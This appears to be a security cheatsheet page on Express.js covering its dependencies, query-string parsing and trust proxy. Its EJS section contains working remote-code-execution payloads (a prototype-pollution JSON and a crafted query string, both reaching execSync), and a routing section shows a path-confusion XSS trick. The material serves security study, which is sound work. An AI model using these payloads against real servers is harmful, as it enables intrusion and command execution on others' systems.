---
title: "Express.js"
description: "Cheatsheet on Express.js library"
lead: "Cheatsheet on Express.js library"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "framework"
weight: 620
toc: true
---

## Express

[Express](https://www.npmjs.com/package/express) is a minimalist web framework for Node.js which has 31 [dependencies](https://www.npmjs.com/package/express?activeTab=dependencies).

{{< details "List of dependencies" >}}
- [accepts](https://www.npmjs.com/package/accepts): Return a different typed respond body based on what the client wants to accept.
- [array-flatten](https://www.npmjs.com/package/array-flatten): Flatten nested arrays (e.g. `flatten([1, [2, 3]])` => `[1, 2, 3]`.
- [body-parser](https://www.npmjs.com/package/body-parser): HTTP request body parsing middleware (`req.body` property).
- [content-disposition](https://www.npmjs.com/package/content-disposition): Create and parse HTTP `Content-Disposition` header.
- [content-type](https://www.npmjs.com/package/content-type): Create and parse HTTP `Content-Type` header.
- [cookie](https://www.npmjs.com/package/cookie): Basic HTTP cookie parser and serializer.
- [cookie-signature](https://www.npmjs.com/package/cookie-signature): Sign and unsign cookies.
- [debug](https://www.npmjs.com/package/debug): JavaScript debugging utility (`debug(...)`, `DEBUG='*' node index.js`).
- [depd](https://www.npmjs.com/package/depd): Mark things deprecated.
- [encodeurl](https://www.npmjs.com/package/encodeurl): Encode a URL to a percent-encoded form, excluding already-encoded sequences.
- [escape-html](https://www.npmjs.com/package/escape-html): Escape string for use in HTML (HTML entity, e.g. `&` => `&amp;`).
- [etag](https://www.npmjs.com/package/etag): Generates HTTP ETags in HTTP responses.
- [finalhandler](https://www.npmjs.com/package/finalhandler): Function to invoke as the final step to respond to HTTP request.
- [fresh](https://www.npmjs.com/package/fresh): Check for caching using `if-none-match` and `etag` HTTP headers.
- [http-errors](https://www.npmjs.com/package/http-errors): Create HTTP errors.
- [merge-descriptors](https://www.npmjs.com/package/merge-descriptors): Merge objects using descriptors (call descriptors and merge).
- [methods](https://www.npmjs.com/package/methods):
- [on-finished](https://www.npmjs.com/package/on-finished):
- [parseurl](https://www.npmjs.com/package/parseurl):
- [path-to-regexp](https://www.npmjs.com/package/path-to-regexp):
- [proxy-addr](https://www.npmjs.com/package/proxy-addr):
- [qs](https://www.npmjs.com/package/qs):
- [range-parser](https://www.npmjs.com/package/range-parser):
- [safe-buffer](https://www.npmjs.com/package/safe-buffer):
- [send](https://www.npmjs.com/package/send):
- [serve-static](https://www.npmjs.com/package/serve-static):
- [setprototypeof](https://www.npmjs.com/package/setprototypeof):
- [statuses](https://www.npmjs.com/package/statuses):
- [type-is](https://www.npmjs.com/package/type-is):
- [utils-merge](https://www.npmjs.com/package/utils-merge):
- [vary](https://www.npmjs.com/package/vary):
{{< /details >}}

## Query string parsing

| URL                       | Content of request.query.foo in code                |
| ------------------------- | --------------------------------------------------- |
| `?foo=bar`                | `'bar'` (string)                                    |
| `?foo=bar&foo=baz`        | `['bar', 'baz']` (array of string)                  |
| `?foo[]=bar`              | `['bar']` (array of string)                         |
| `?foo[]=bar&foo[]=baz`    | `['bar', 'baz']` (array of string)                  |
| `?foo[bar]=baz`           | `{ bar : 'baz' }` (object with a key)               |
| `?foo[]=bar`              | `['bar']` (array of string)                         |
| `?foo[]baz=bar`           | `['bar']` (array of string - postfix is lost)       |
| `?foo[][baz]=bar`         | `[ { baz: 'bar' } ]` (array of object)              |
| `?foo[bar][baz]=bar`      | `{ foo: { bar: { baz: 'bar' } } }` (object tree)    |
| `?foo[10]=bar&foo[9]=baz` | `[ 'baz', 'bar' ]` (array of string - notice order) |
| `?foo[toString]=bar`      | `{}` (object where calling `toString()` will fail)  |

> Table from [OWASP - Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#perform-input-validation).

## Trust proxy

Enabling `trust proxy` will have the following impact:

- `req.hostname` = `X-Forwarded-Host`
- `req.protocol` = `X-Forwarded-Proto` (https or http or even an invalid name)
- `req.ip` and `req.ips` = `X-Forwarded-For`

The trust proxy setting is implemented using the [proxy-addr](https://www.npmjs.com/package/proxy-addr) package. See [docs](https://expressjs.com/en/guide/behind-proxies.html).

## EJS

[Embedded JavaScript templates (EJS)](https://www.npmjs.com/package/ejs) is a NodeJS library very often used by Express to create HTML templates.

### RCE on render

The following code is inside EJS ([lib/ejs.js](https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L509) - v3.1.9). If you control the value of both variables `client` and `escape`, you can get a RCE.

```js
function Template(text, opts) {
    // ...
    options.client = opts.client || false;
    options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;

    this.opts = options;
    // ...
  }

Template.prototype = {
    // ...
    compile: function () {
        var opts = this.opts;
        var escapeFn = opts.escapeFunction;

        if (opts.client) {
            src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
        }
        // ...
        // src is evaluated later
    }
}
```

{{< details "EJS RCE - Proof of Concept" >}}
There are two options for controlling these variables.

1. Abuse server-side prototype pollution (SSPP)
2. Custom parameters to the render function of EJS

#### 1. SSPP

> Full article on [mizu.re](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce).

**TL;DR:**

```json
{
    "__proto__": {
        "client": 1,
        "escape": "1;return process.mainModule.require('child_process').execSync('id');"
    }
}
```

#### 2. Custom parameters of render

> Inspired from the challenge *Peculiar Caterpillar* of the [FCSC2023](https://france-cybersecurity-challenge.fr).

`req.query` will be equal to the `options` parameter passed to the `render` function of `Express`.

```js
require("express")()
.set("view engine", "ejs")
.use((req, res) => {
    res.render("index", { ...req.query })
})
.listen(3000);
```

The `render` function of `Express` calls the `renderFile` function of EJS.

- `render` => `renderFile` => `...` => `Template.new` => `Template.compile`

Here is the code of the `renderFile` function of EJS:

```js
var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',
  'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async'];

// ...
exports.renderFile = function () {
    var args = Array.prototype.slice.call(arguments);
    var filename = args.shift();        // arg[0] = PATH of the template
    var opts = {filename: filename};

    // ...
    data = args.shift();                // arg[1] = {
                                        //    "settings": env, view engine, etag, ...,
                                        //    query string,
                                        //    "cache": false
                                        // }
    viewOpts = data.settings['view options'];
    if (viewOpts) {
      utils.shallowCopy(opts, viewOpts);
    }

    // 'client' is allowed to be copied
    utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
    // ...

    return tryHandleCache(opts, data, cb);
};
```

The `opts` variable is then passed to the `Template` object. So, we can get a RCE with the following query string.

```
?client=1&settings[view options][escape]=1;return+process.mainModule.require("child_process").execSync("id").toString();
```

This query string is equals to:

```js
{
  settings: {
    'view options': {
      escape: '1;return process.mainModule.require("child_process").execSync("id").toString();'
    }
  },
  client: '1'
}
```
{{< /details >}}

## Base routing

File: `main.js`

```js
const express = require('express')

const port = 3000;
const app = express()

app.use(
	express.static('static', {
		index: 'index.html'
	})
)

app.use((req, res) => {
	res.type('text').send(`Page ${req.path} not found`)
})

app.listen(port, async () => {
	console.log(`Listening on http://0.0.0.0:${port}`)
})
```

File: `static/index.html`

```html
<html>
	<head>
		<title>Home</title>
	</head>
	</body>
		<h3>Home</h3>
		<script src="index.js"></script>
	</body>
</html>
```

If you visit `/example/..%2Findex.html`, your browser will load the JS script `index.js` at `/example/index.js`.

Similarly, if you visit `/1+alert();var[Page]=1//..%2Findex.html`, the browser will load the JS script at `/1+alert();var[Page]=1//index.js`. Consequently, the content of the script `index.js` will be:

```js
Page /1+alert();var[Page]=1//index.js not found
```

An alert will be then executed.